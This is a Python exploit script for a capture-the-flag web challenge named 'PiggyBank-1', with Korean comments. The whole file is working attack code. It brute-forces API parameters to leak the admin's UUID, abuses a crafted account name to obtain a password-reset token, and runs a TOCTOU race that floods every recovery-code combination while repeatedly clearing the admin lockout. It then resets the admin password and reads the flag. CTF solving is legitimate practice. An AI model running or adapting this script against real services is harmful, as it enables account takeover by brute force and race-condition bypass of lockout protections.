import asyncio
import aiohttp
import requests
import re
import itertools
import time
import uuid

TARGET_URL = "http://localhost:8080"
SECURE_CODE_LIST = [
    "refuse", "sector", "dentist", "release", "tenant", "lunch", "code", "partner", 
    "chicken", "ribbon", "apple", "cargo", "damage", "enjoy", "index", "theori", 
    "dreamhack", "across", "idea", "noble"
]

def debug_print(step_name, res):
    print(f"  [>] {step_name} 응답 코드: HTTP {res.status_code}")
    if "alert alert-danger" in res.text:
        err = re.search(r'class="alert alert-danger"[^>]*>([^<]+)<', res.text)
        if err:
            print(f"  [!] 서버 에러 메시지: {err.group(1).strip()}")

def get_admin_uuid():
    print("\n[*] 1단계: 임시 계정 생성 및 Cash Log 파라미터 브루트포싱")
    s = requests.Session()
    uid = f"h{uuid.uuid4().hex[:4]}"
    
    s.post(f"{TARGET_URL}/user/signup", data={
        "username": uid, "password": "Password123!", "email": f"{uid}@a.com",
        "realName": "Hacker", "regNumber": "990101000000000", "memo": "m", "countryCode": "82"
    })
    s.post(f"{TARGET_URL}/user/signin", data={"username": uid, "password": "Password123!"})
    
    print("  [*] 숨겨진 Cash Log 조합을 찾기 위해 파라미터 브루트포싱 돌입...")
    test_categories = ["ALL", "RECEIVE", "SEND", "reward", "transfer", "commission", "REWARD", "TRANSFER", ""]
    
    for c1 in test_categories:
        for c2 in test_categories:
            res_log = s.post(f"{TARGET_URL}/api/cash/krw/log", data={"category": c1, "category2": c2})
            if res_log.status_code == 200:
                try:
                    logs = res_log.json()
                    if logs and len(logs) > 0:
                        for log in logs:
                            sender_id = log.get("sender_id") or log.get("senderId")
                            if sender_id and sender_id != "system":
                                print(f"  [🎉] 가입 축하금 송금자(Admin) UUID 탈취 완료: {sender_id}")
                                return sender_id
                except:
                    pass
    return None

def get_master_unlock_token(admin_uuid):
    s = requests.Session()
    manip_id = f"LOCK:{admin_uuid}" 
    manip_pw = "MasterKey123!"
    
    print(f"\n[*] 2단계: 트로이 목마 계정 생성 (ID: {manip_id})")
    res_up = s.post(f"{TARGET_URL}/user/signup", data={
        "username": manip_id, "password": manip_pw, "email": "lock@hacker.com",
        "realName": "Lock", "regNumber": "990101000000000", "memo": "m", "countryCode": "82"
    }, allow_redirects=True)
    
    clean_text = re.sub(r'<[^>]+>', ' ', res_up.text)
    code_match = re.search(r'([a-z]+(?:\s*,\s*[a-z]+){19})', clean_text.lower())
    
    if not code_match:
        trojan_secure_code = input("  [!] 복구 코드 파싱 실패. 20개 코드를 쉼표로 구분해 입력하세요: ")
    else:
        trojan_secure_code = code_match.group(1)
        print(f"  [+] 복구 코드 20개 파싱 완료: {trojan_secure_code[:30]}...")
        
    codes = [c.strip() for c in trojan_secure_code.split(",")]
    
    s_anon = requests.Session()
    res_reset = s_anon.post(f"{TARGET_URL}/user/reset/", data={"username": manip_id}, allow_redirects=True)
    
    token_match = re.search(r'name="challengeToken"\s+value="([^"]+)"', res_reset.text)
    if not token_match:
        print("  [!] challengeToken 발급 실패.")
        return None
    manip_chal_token = token_match.group(1)
    
    print("\n  [?] 챌린지 페이지 화면 텍스트 (여기서 요구하는 번호를 확인하세요!)")
    visible_text = re.sub(r'<style.*?</style>', '', res_reset.text, flags=re.DOTALL|re.IGNORECASE)
    visible_text = re.sub(r'<script.*?</script>', '', visible_text, flags=re.DOTALL|re.IGNORECASE)
    visible_text = re.sub(r'<[^>]+>', ' ', visible_text)
    visible_text = re.sub(r'\s+', ' ', visible_text).strip()
    
    # 핵심 문장이 있을 만한 부분(challengeToken 근처)을 출력
    print("  " + "-"*50)
    print(f"  {visible_text[:800]}...") 
    print("  " + "-"*50)
    
    # 확실한 수동 입력
    print("  위 텍스트에서 'N번째', 'M번째' 단어를 요구하는 숫자를 확인하고 입력해주세요.")
    idx1 = int(input("  첫 번째 요구 단어 번호(숫자만 입력): "))
    idx2 = int(input("  두 번째 요구 단어 번호(숫자만 입력): "))
        
    ans1, ans2 = codes[idx1-1], codes[idx2-1]
    print(f"  [+] 마스터키 정답 제출: {idx1}번째({ans1}), {idx2}번째({ans2})")
    
    res_solve = s_anon.post(f"{TARGET_URL}/user/reset/challenge", 
                            data={"answers": f"{ans1},{ans2}", "challengeToken": manip_chal_token}, 
                            allow_redirects=True)
    
    pass_token_match = re.search(r'name="passResetToken"\s+value="([^"]+)"', res_solve.text)
    if not pass_token_match:
        print("  [!] 마스터 토큰 발급 실패. 번호를 잘못 입력했을 수 있습니다.")
        return None
    return pass_token_match.group(1)

async def unlock_worker(session, master_token):
    print("\n[*] 락 해머 가동! (백그라운드에서 Admin Lock 무한 철거 중...)")
    url = f"{TARGET_URL}/user/reset/password"
    data = {"firstPassword": "Pwned123!", "secondPassword": "Pwned123!", "passResetToken": master_token}
    while True:
        try:
            await session.post(url, data=data)
            await asyncio.sleep(0.05)
        except:
            pass

async def attack_admin(session, challenge_token, answers):
    data = {"answers": answers, "challengeToken": challenge_token}
    try:
        async with session.post(f"{TARGET_URL}/user/reset/challenge", data=data, timeout=25) as resp:
            text = await resp.text()
            if "passResetToken" in text:
                return re.search(r'name="passResetToken"\s+value="([^"]+)"', text).group(1), answers
    except:
        pass
    return None

async def main_async():
    print("="*60)
    print("🐖 PiggyBank-1 Ultimate Masterpiece Exploit 🐖")
    print("="*60)

    admin_uuid = get_admin_uuid()
    if not admin_uuid: return

    master_token = get_master_unlock_token(admin_uuid)
    if not master_token: return
    print(f"  [🎉] 마스터 토큰 획득 성공 -> {master_token}")

    print("\n[*] 3단계: Admin 비밀번호 초기화(TOCTOU) 공격 준비")
    s_anon = requests.Session()
    reset_req = s_anon.post(f"{TARGET_URL}/user/reset/", data={"username": "admin"}, allow_redirects=True)
    admin_chal_token = re.search(r'name="challengeToken"\s+value="([^"]+)"', reset_req.text).group(1)
    print(f"  [+] Admin Challenge Token 준비 완료")

    combinations = list(itertools.permutations(SECURE_CODE_LIST, 2))
    
    async with aiohttp.ClientSession() as session:
        hammer_task = asyncio.create_task(unlock_worker(session, master_token))
        
        print(f"\n[*] 4단계: 380개 조합 동시 폭격 & TOCTOU 레이스 시작! (약 8~10초 대기)")
        start_time = time.time()
        tasks = [attack_admin(session, admin_chal_token, ",".join(c)) for c in combinations]
        
        for completed in asyncio.as_completed(tasks):
            result = await completed
            if result:
                hammer_task.cancel()
                admin_pass_token, ans = result
                print(f"\n[🔥 SUCCESS] 정답 발견! 조합: {ans} (소요시간: {time.time()-start_time:.2f}초)")
                
                new_pw = "pwned_admin_123!"
                print("\n[*] 5단계: 탈취한 토큰으로 Admin 비밀번호 변경 및 Flag 획득")
                s_anon.post(f"{TARGET_URL}/user/reset/password", data={"firstPassword": new_pw, "secondPassword": new_pw, "passResetToken": admin_pass_token})
                s_anon.post(f"{TARGET_URL}/user/signin", data={"username": "admin", "password": new_pw})
                
                mypage_req = s_anon.post(f"{TARGET_URL}/api/user/mypage")
                flag = mypage_req.json().get("memo")
                print("\n" + "="*60)
                print(f"🎉 FLAG FOUND: {flag}")
                print("="*60)
                return

    hammer_task.cancel()
    print("[-] 실패했습니다. 서버(도커)를 재시작하고 다시 돌려주세요.")

if __name__ == "__main__":
    asyncio.run(main_async())